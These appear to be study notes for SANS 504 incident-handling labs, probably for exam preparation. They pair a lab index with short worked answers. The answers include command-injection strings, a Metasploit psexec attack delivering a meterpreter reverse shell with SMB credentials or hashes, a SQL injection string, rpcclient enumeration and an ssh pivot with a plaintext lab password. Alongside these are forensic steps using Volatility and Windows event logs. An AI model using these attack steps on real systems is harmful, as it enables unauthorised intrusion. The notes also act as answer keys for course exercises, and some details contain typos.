# SANS 504 Lab Index

`Book 1`

`Live Windows Examination`

`Network Investigation`

`Memory Investigation`

`Malware Investigation`

`Cloud Investigation`

_______________________________

`Book 2`

`OSINT with SpiderFoot`

`DNS Interrogation`

`Nmap`

`Cloud Scanning`

`SMB Sessions`

`Windows Password Spray Detection`

_______________________________

`Book 3`

`Password Guessing with Hydra`

`John the ripper`

`Hashcat`

`Domain Password Audit Tool (DPAT)`

`Cloud Bucket Discovery`

`Netcats Many Uses`

_______________________________

`Book 4`

`Metasploit attack and analysis`

`BeEF for Browser Exploitation`

`System Resource Usage and Database Analysis`

`Command Injection Attack`

`Cross-Site Scripting`

`SQL Injection`

`Cloud SSRF/IMDS Attack`

_______________________________

`Book 5`

`Pivoting with Metasploit`

`Responder Attack`

`Establishing persistence with Metasploit`

`Real Intelligence Threat Analytics (RITA)`

`Cloud Configuration Assessment`



`Command Injection (Lab 4.4)`


---

`Example`; Use command injection to identify the directory that contains the files and display the contents of the files. 



1. Inject command to show directories (; ls) or (&& ls)
2. Cat applicable files (; cat./file/file1.txt) 

`Metasploit (Lab 4.1)`


---

`Example`; Which of the following hotfixes are installed on the target hosts?



1. msfdb start (Initiate the Metasploit database process and supporting services)
2. msfconsole (Start the msf console)
3. use exploit/windows/smb/psexec
4. set PAYLOAD windows/meterpreter/reverse_tcp
5. show options (Optional)
6. set RHOSTS [IP] (Windows 10 host)
7. set SMBUSER [Username of Win 10 in Admin-Group]
8. set SMBPASS [could be password OR LANMAN:NTHash]
9. set LHOST [IP] (Localhost, Slingshot)
10. Leave LPORT as default, TCP/4444
11. show options (Optional)
12. exploit
13. To find the hotfix from the meterpreter prompt, run the following command; _execute -if systeminfo_

`Netcat (Lab 3.6)`


---

`Example`; What version of Sendmail is running? 



1. nc 127.0.0.1 25 (Will reveal the version of Sendmail)

`Example`; There is another host on this subnet with an unknown service running. Connect to the port. What is the first line of text sent by the server? 



1. nc [IP] [Port]

`net user (Establishing Persistence with Metasploit 5.3)`


---

`Example`; Which account did the attacker create?



1. The new account can be identified by checking “net user” to see a list of all users on the system, and in Powershell (Run as Admin)
    1. Get-WinEvent -FilterHashtable @{Logname=’Security’;ID=4720} | fl-property timecreated, message

`rpcclient`


---

`Example`; What is the relative identifier for the “Performance Log Users” group on the host 192.168.101.150?



1. rpcclient 192.168.101.150 -U Candidate
2. [Password]
3. rpcclient > enumalsgroups builtin
    1. Or ‘server type string’ > srvinfo

`ssh`


---

`Example`; Reconnaissance has found that host 10.10.10.20 has an ssh server running on port 3192 that can be logged into with the credentials below. What IP can be seen from the host 10.10.10.20 that is not visible from the host 10.10.10.10.



1. To see these hosts you must first open an SSH session to 10.10.10.20 with the credentials obtained in the reconnaissance phase:
    1. ssh bweir@10.10.10.20 -p3192
    2. bweir@10.10.10.20 password: estimated
2. Check the network configuration by using the _ifconfig_ command. The output from _ifconfig_ will show that there is another network associated with the interface eth1. Now you can run nmap scan to see other hosts on this new network. 
    3. nmap -sn 102.168.66.0/24

`SQL Injection (Lab 4.6)`


---

`Example`; Which form field on the website www.example.com is vulnerable to SQL injection?



1. By probing each of the form fields with SQL injection strings, the field “City” will return the values when a string such as ‘or '1'='1 is entered. 

`Volatility (Memory Investigation 1.3)`


---

`Example`; How many .dll files are associated with LoadCount 0xffff for the file SecurityHealthService.exe (pid 3024)?



1. cd /opt/volatility
2. source venv/bin/activate
3. python vol.py -f /home/giac/memory_captures/hen_memdump.mem --profile=Win10x64_15-63 dlllist
4. Consider piping the above vol.py command through something like _grep -A 10-B 10 “3024” _in order to narrow results